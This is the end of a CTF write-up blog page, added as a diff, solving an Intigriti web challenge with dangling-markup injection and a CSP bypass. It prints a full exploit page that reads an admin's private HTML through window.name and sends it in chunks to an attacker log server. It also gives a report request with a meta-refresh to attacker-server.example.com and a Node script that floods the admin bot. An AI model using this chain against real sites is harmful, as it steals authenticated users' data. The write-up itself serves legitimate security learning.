+</span><span style="color:#abb2bf;">  </span><span style="color:#adb7c9;">f</span><span style="color:#abb2bf;">.style.cssText </span><span style="color:#adb7c9;">= </span><span style="color:#9acc76;">&#39;position:absolute;left:-9999px;width:1px;height:1px&#39;</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">  </span><span style="color:#adb7c9;">f</span><span style="color:#abb2bf;">.src </span><span style="color:#adb7c9;">= </span><span style="color:#9acc76;">&#39;https://challenge-0626.intigriti.io/search&#39;
+</span><span style="color:#abb2bf;">        </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;?q=&#39; </span><span style="color:#adb7c9;">+ </span><span style="color:#5ebfcc;">encodeURIComponent</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&quot;zzqx&#39;&quot;</span><span style="color:#abb2bf;">)
+</span><span style="color:#abb2bf;">        </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;&amp;description=&#39; </span><span style="color:#adb7c9;">+ </span><span style="color:#5ebfcc;">encodeURIComponent</span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">inj</span><span style="color:#abb2bf;">)
+</span><span style="color:#abb2bf;">        </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;&amp;owner=&#39; </span><span style="color:#adb7c9;">+ </span><span style="color:#5ebfcc;">encodeURIComponent</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">OWNER</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">let </span><span style="color:#adb7c9;">fired = </span><span style="color:#db9d63;">0</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">  </span><span style="color:#f0c678;">f</span><span style="color:#abb2bf;">.</span><span style="color:#adb7c9;">onload = </span><span style="color:#abb2bf;">() </span><span style="color:#cd74e8;">=&gt; </span><span style="color:#abb2bf;">{
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">if </span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">fired++</span><span style="color:#abb2bf;">) </span><span style="color:#cd74e8;">return</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">    </span><span style="color:#adb7c9;">new </span><span style="color:#eb6772;">Image</span><span style="color:#abb2bf;">().src </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">LOG </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;?stage=parent_onload&#39;</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">let </span><span style="color:#adb7c9;">inner</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">try </span><span style="color:#abb2bf;">{ </span><span style="color:#adb7c9;">inner = f</span><span style="color:#abb2bf;">.contentWindow[</span><span style="color:#db9d63;">0</span><span style="color:#abb2bf;">]; }
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">catch </span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">e</span><span style="color:#abb2bf;">) {
+</span><span style="color:#abb2bf;">      </span><span style="color:#adb7c9;">new </span><span style="color:#eb6772;">Image</span><span style="color:#abb2bf;">().src </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">LOG </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;?stage=index&amp;err=&#39; </span><span style="color:#adb7c9;">+ </span><span style="color:#5ebfcc;">encodeURIComponent</span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">e</span><span style="color:#abb2bf;">.message);
+</span><span style="color:#abb2bf;">      </span><span style="color:#cd74e8;">return</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">    }
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">if </span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">!inner</span><span style="color:#abb2bf;">) {
+</span><span style="color:#abb2bf;">      </span><span style="color:#adb7c9;">new </span><span style="color:#eb6772;">Image</span><span style="color:#abb2bf;">().src </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">LOG </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;?stage=noinner&#39;</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">      </span><span style="color:#cd74e8;">return</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">    }
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">try </span><span style="color:#abb2bf;">{ </span><span style="color:#adb7c9;">inner</span><span style="color:#abb2bf;">.location </span><span style="color:#adb7c9;">= </span><span style="color:#9acc76;">&#39;about:blank&#39;</span><span style="color:#abb2bf;">; }
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">catch </span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">e</span><span style="color:#abb2bf;">) {
+</span><span style="color:#abb2bf;">      </span><span style="color:#adb7c9;">new </span><span style="color:#eb6772;">Image</span><span style="color:#abb2bf;">().src </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">LOG </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;?stage=nav&amp;err=&#39; </span><span style="color:#adb7c9;">+ </span><span style="color:#5ebfcc;">encodeURIComponent</span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">e</span><span style="color:#abb2bf;">.message);
+</span><span style="color:#abb2bf;">      </span><span style="color:#cd74e8;">return</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">    }
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">    </span><span style="color:#5ebfcc;">setTimeout</span><span style="color:#abb2bf;">(() </span><span style="color:#cd74e8;">=&gt; </span><span style="color:#abb2bf;">{
+</span><span style="color:#abb2bf;">      </span><span style="color:#cd74e8;">let </span><span style="color:#adb7c9;">data</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">      </span><span style="color:#cd74e8;">try </span><span style="color:#abb2bf;">{ </span><span style="color:#adb7c9;">data = </span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">f</span><span style="color:#abb2bf;">.contentWindow[</span><span style="color:#db9d63;">0</span><span style="color:#abb2bf;">] </span><span style="color:#adb7c9;">&amp;&amp; f</span><span style="color:#abb2bf;">.contentWindow[</span><span style="color:#db9d63;">0</span><span style="color:#abb2bf;">].name) </span><span style="color:#adb7c9;">|| </span><span style="color:#9acc76;">&#39;&#39;</span><span style="color:#abb2bf;">; }
+</span><span style="color:#abb2bf;">      </span><span style="color:#cd74e8;">catch </span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">e</span><span style="color:#abb2bf;">) {
+</span><span style="color:#abb2bf;">        </span><span style="color:#adb7c9;">new </span><span style="color:#eb6772;">Image</span><span style="color:#abb2bf;">().src </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">LOG </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;?stage=read&amp;err=&#39; </span><span style="color:#adb7c9;">+ </span><span style="color:#5ebfcc;">encodeURIComponent</span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">e</span><span style="color:#abb2bf;">.message);
+</span><span style="color:#abb2bf;">        </span><span style="color:#cd74e8;">return</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">      }
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">      </span><span style="color:#cd74e8;">if </span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">!data</span><span style="color:#abb2bf;">) {
+</span><span style="color:#abb2bf;">        </span><span style="color:#adb7c9;">new </span><span style="color:#eb6772;">Image</span><span style="color:#abb2bf;">().src </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">LOG </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;?stage=nodata&#39;</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">        </span><span style="color:#cd74e8;">return</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">      }
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">      </span><span style="color:#cd74e8;">const </span><span style="color:#adb7c9;">encoded = </span><span style="color:#5ebfcc;">encodeURIComponent</span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">data</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">      </span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">CHUNK </span><span style="color:#adb7c9;">= </span><span style="color:#db9d63;">1500</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">      </span><span style="color:#adb7c9;">new </span><span style="color:#eb6772;">Image</span><span style="color:#abb2bf;">().src </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">LOG </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;?len=&#39; </span><span style="color:#adb7c9;">+ encoded</span><span style="color:#abb2bf;">.length
+</span><span style="color:#abb2bf;">                     </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;&amp;raw=&#39; </span><span style="color:#adb7c9;">+ data</span><span style="color:#abb2bf;">.length
+</span><span style="color:#abb2bf;">                     </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;&amp;n=&#39; </span><span style="color:#adb7c9;">+ </span><span style="color:#abb2bf;">Math.</span><span style="color:#5ebfcc;">ceil</span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">encoded</span><span style="color:#abb2bf;">.length </span><span style="color:#adb7c9;">/ </span><span style="color:#eb6772;">CHUNK</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">      </span><span style="color:#cd74e8;">for </span><span style="color:#abb2bf;">(</span><span style="color:#cd74e8;">let </span><span style="color:#adb7c9;">i = </span><span style="color:#db9d63;">0</span><span style="color:#abb2bf;">; </span><span style="color:#adb7c9;">i &lt; encoded</span><span style="color:#abb2bf;">.length; </span><span style="color:#adb7c9;">i += </span><span style="color:#eb6772;">CHUNK</span><span style="color:#abb2bf;">) {
+</span><span style="color:#abb2bf;">        </span><span style="color:#adb7c9;">new </span><span style="color:#eb6772;">Image</span><span style="color:#abb2bf;">().src </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">LOG </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;?i=&#39; </span><span style="color:#adb7c9;">+ i + </span><span style="color:#9acc76;">&#39;&amp;d=&#39; </span><span style="color:#adb7c9;">+ encoded</span><span style="color:#abb2bf;">.</span><span style="color:#eb6772;">slice</span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">i</span><span style="color:#abb2bf;">, </span><span style="color:#adb7c9;">i + </span><span style="color:#eb6772;">CHUNK</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">      }
+</span><span style="color:#abb2bf;">    }, </span><span style="color:#db9d63;">1500</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">  };
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">  document.body.</span><span style="color:#eb6772;">appendChild</span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">f</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">})();
+</span><span style="color:#abb2bf;">&lt;/</span><span style="color:#eb6772;">script</span><span style="color:#abb2bf;">&gt;
+</span><span style="color:#abb2bf;">&lt;/</span><span style="color:#eb6772;">body</span><span style="color:#abb2bf;">&gt;
+</span><span style="color:#abb2bf;">&lt;/</span><span style="color:#eb6772;">html</span><span style="color:#abb2bf;">&gt;
+</span></code></pre>
+<h2 id="reporting-to-the-admin">Reporting to the Admin</h2>
+<p>With the server running, send reports that redirect the admin to our exploit page:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">POST /report
+</span><span style="color:#abb2bf;">Host: challenge-0626.intigriti.io
+</span><span style="color:#abb2bf;">Cookie: session=YOUR_SESSION_COOKIE
+</span><span style="color:#abb2bf;">Content-Type: application/x-www-form-urlencoded
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">path=/search?q=UNIQUE_ID&amp;description=&quot;&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=https://attacker-server.example.com/&quot;&gt;&amp;owner=admin
+</span></code></pre>
+<p>The admin bot:</p>
+<ol>
+<li>Visits the challenge search page</li>
+<li>The meta refresh redirects to our exploit page</li>
+<li>The exploit creates an iframe to the challenge with the dangling injection and <code>owner=admin</code></li>
+<li>The admin's <code>SameSite=None</code> session cookie is sent with the iframe request</li>
+<li>The iframe loads the admin's private search results</li>
+<li>The dangling <code>&lt;iframe name='</code> captures all 710KB of HTML into <code>window.name</code></li>
+<li>The child iframe is navigated to <code>about:blank</code> → same-origin → <code>window.name</code> is read</li>
+<li>Data is chunked and sent to our server via <code>new Image().src</code></li>
+</ol>
+<h2 id="getting-the-flag">Getting the Flag</h2>
+<pre data-lang="javascript" style="background-color:#2b303b;color:#6c7079;" class="language-javascript "><code class="language-javascript" data-lang="javascript"><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">https </span><span style="color:#adb7c9;">= </span><span style="color:#5ebfcc;">require</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;https&#39;</span><span style="color:#abb2bf;">);
+</span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">COOKIE </span><span style="color:#adb7c9;">= </span><span style="color:#9acc76;">&#39;session=YOUR_SESSION_COOKIE&#39;</span><span style="color:#abb2bf;">;
+</span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">SERVER </span><span style="color:#adb7c9;">= </span><span style="color:#9acc76;">&#39;https://attacker-server.example.com&#39;</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">
+</span><span style="color:#cd74e8;">function </span><span style="color:#5cb3fa;">sendReport</span><span style="color:#abb2bf;">() {
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">meta </span><span style="color:#adb7c9;">= </span><span style="color:#9acc76;">&#39;&quot;&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=&#39; </span><span style="color:#adb7c9;">+ </span><span style="color:#eb6772;">SERVER </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;&quot;&gt;&#39;</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">path </span><span style="color:#adb7c9;">= </span><span style="color:#9acc76;">&#39;/search?q=&#39; </span><span style="color:#adb7c9;">+ </span><span style="color:#f0c678;">Date</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">now</span><span style="color:#abb2bf;">()
+</span><span style="color:#abb2bf;">    </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;&amp;description=&#39; </span><span style="color:#adb7c9;">+ </span><span style="color:#5ebfcc;">encodeURIComponent</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">meta</span><span style="color:#abb2bf;">)
+</span><span style="color:#abb2bf;">    </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;&amp;owner=admin&#39;</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">postData </span><span style="color:#adb7c9;">= </span><span style="color:#9acc76;">&#39;path=&#39; </span><span style="color:#adb7c9;">+ </span><span style="color:#5ebfcc;">encodeURIComponent</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">path</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">req </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">https</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">request</span><span style="color:#abb2bf;">({
+</span><span style="color:#abb2bf;">    hostname: </span><span style="color:#9acc76;">&#39;challenge-0626.intigriti.io&#39;</span><span style="color:#abb2bf;">, port: </span><span style="color:#db9d63;">443</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">    path: </span><span style="color:#9acc76;">&#39;/report&#39;</span><span style="color:#abb2bf;">, method: </span><span style="color:#9acc76;">&#39;POST&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">    headers: {
+</span><span style="color:#abb2bf;">      </span><span style="color:#9acc76;">&#39;Content-Type&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#9acc76;">&#39;application/x-www-form-urlencoded&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">      </span><span style="color:#9acc76;">&#39;Cookie&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#eb6772;">COOKIE
+</span><span style="color:#abb2bf;">    }
+</span><span style="color:#abb2bf;">  }, (</span><span style="color:#eb6772;">res</span><span style="color:#abb2bf;">) </span><span style="color:#cd74e8;">=&gt; </span><span style="color:#eb6772;">res</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">resume</span><span style="color:#abb2bf;">());
+</span><span style="color:#abb2bf;">  </span><span style="color:#eb6772;">req</span><span style="color:#abb2bf;">.</span><span style="color:#5ebfcc;">write</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">postData</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">  </span><span style="color:#eb6772;">req</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">end</span><span style="color:#abb2bf;">();
+</span><span style="color:#abb2bf;">}
+</span><span style="color:#abb2bf;">
+</span><span style="font-style:italic;color:#5f697a;">// Send multiple with unique q= values to avoid dedup
+</span><span style="color:#cd74e8;">for </span><span style="color:#abb2bf;">(</span><span style="color:#cd74e8;">let </span><span style="color:#eb6772;">i </span><span style="color:#adb7c9;">= </span><span style="color:#db9d63;">0</span><span style="color:#abb2bf;">; </span><span style="color:#eb6772;">i </span><span style="color:#adb7c9;">&lt; </span><span style="color:#db9d63;">30</span><span style="color:#abb2bf;">; </span><span style="color:#eb6772;">i</span><span style="color:#adb7c9;">++</span><span style="color:#abb2bf;">) </span><span style="color:#5cb3fa;">sendReport</span><span style="color:#abb2bf;">();
+</span></code></pre>
+<p>After a few minutes, the server logs:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">STAGE parent_onload
+</span><span style="color:#abb2bf;">expecting 710395 bytes (encoded)
+</span><span style="color:#abb2bf;">FLAG: INTIGRITI{019ea42e-f5af-76ea-85d7-7459d17736ce}
+</span><span style="color:#abb2bf;">dump written to dump-1781900893631.html
+</span></code></pre>
+<h2 id="congratulations">Congratulations!</h2>
+<p><strong>Flag:</strong> <code>INTIGRITI{019ea42e-f5af-76ea-85d7-7459d17736ce}</code></p>
+<p>A very fun challenge that forces you to get creative with HTML parsing quirks. The key takeaways:</p>
+<ul>
+<li><code>default-src 'none'</code> kills everything except navigation — so use it</li>
+<li>Dangling markup is a powerful technique when scripts are blocked</li>
+<li>Cross-origin <strong>writes</strong> (location) are allowed even when reads are blocked</li>
+<li><code>window.name</code> persists across navigations — and becomes same-origin after <code>about:blank</code></li>
+<li>Always use unique values in your report payloads to avoid admin bot dedup</li>
+</ul>
+<hr />
+<p>If you have any questions, feel free to reach out to me on <a href="https://x.com/machiavelli">X</a> and <a href="https://keybase.io/makyavelli">Keybase</a>!</p>
+
+    </div>
+
+    
+        <footer>
+            <hr>
+            <p>
+                
+                    Published by Machiavelli
+                
+                
+                    
+                    in <a href="https://machiavelli.me/categories/ctf/">CTF</a>
+                
+                
+                    and
+                    tagged
+                    
+                        <a href="https://machiavelli.me/tags/ctf/">CTF</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/challenge/">Challenge</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/intigriti/">Intigriti</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/xss/">XSS</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/csp-bypass/">CSP Bypass</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/dangling-markup/">Dangling Markup</a>
+                        
+                            
+                                
+                                    and
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/html-injection/">HTML Injection</a>
+                        
+                            
+                        
+                    
+                
+            </p>
+            
+            
+        </footer>
+    
+</article>
+
+
+
+  <!-- optional scripts -->
+  
+  
+  <script src="https://machiavelli.me/js/codeblock.js"></script>
+  
+
+  
+<!-- MathJax script for rendering LaTeX math equations -->
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"],
+      ],
+      displayMath: [
+        ["$$", "$$"],
+        ["\\[", "\\]"],
+      ],
+    },
+  };
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js" async></script>
+
+
+  
+<script type="text/javascript" src="https://machiavelli.me/elasticlunr.min.js"></script>
+<script type="text/javascript" src="https://machiavelli.me/js/search.js"></script>
+
+
+  
+</body>
+
+</html>
